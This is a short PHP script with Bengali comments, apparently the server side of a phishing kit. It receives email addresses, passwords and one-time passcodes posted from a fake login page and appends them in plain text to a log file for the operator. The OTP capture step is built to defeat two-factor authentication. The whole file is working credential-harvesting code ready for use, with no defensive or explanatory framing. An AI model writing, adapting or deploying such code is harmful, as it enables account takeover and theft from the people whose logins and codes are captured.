<?php
// ফাইলটির নাম অবশ্যই login.php রাখবেন
// এটি আপনার টার্মিনাল বা log.txt ফাইলে ডাটা সেভ করবে

// টাইমজোন সেট করা (ঐচ্ছিক)
date_default_timezone_set('Asia/Dhaka');

// ডাটা রিসিভ করা
$action = isset($_POST['action']) ? $_POST['action'] : '';
$email = isset($_POST['email']) ? $_POST['email'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';
$otp = isset($_POST['otp']) ? $_POST['otp'] : '';

// লগ ফাইলের নাম
$filename = "log.txt";

// ফাইলটি ওপেন করা (Append মোডে)
$file = fopen($filename, "a");

if ($action == "login") {
    // যখন ইউজার পাসওয়ার্ড দিয়ে 'Next' করবে
    $logData = "---------- [ NEW LOGIN ] ----------\n";
    $logData .= "Email    : " . $email . "\n";
    $logData .= "Password : " . $password . "\n";
    $logData .= "Date/Time: " . date("d-M-Y | h:i:s A") . "\n";
    $logData .= "-----------------------------------\n\n";
    
    fwrite($file, $logData);
} 
elseif ($action == "otp") {
    // যখন ইউজার ওটিপি কোড দিবে
    $logData = "---------- [ RECEIVED OTP ] ----------\n";
    $logData .= "OTP Code : " . $otp . "\n";
    $logData .= "Date/Time: " . date("d-M-Y | h:i:s A") . "\n";
    $logData .= "--------------------------------------\n\n";
    
    fwrite($file, $logData);
}

fclose($file);

// সাকসেস মেসেজ (ব্রাউজার কনসোলের জন্য)
echo "Success";
?>
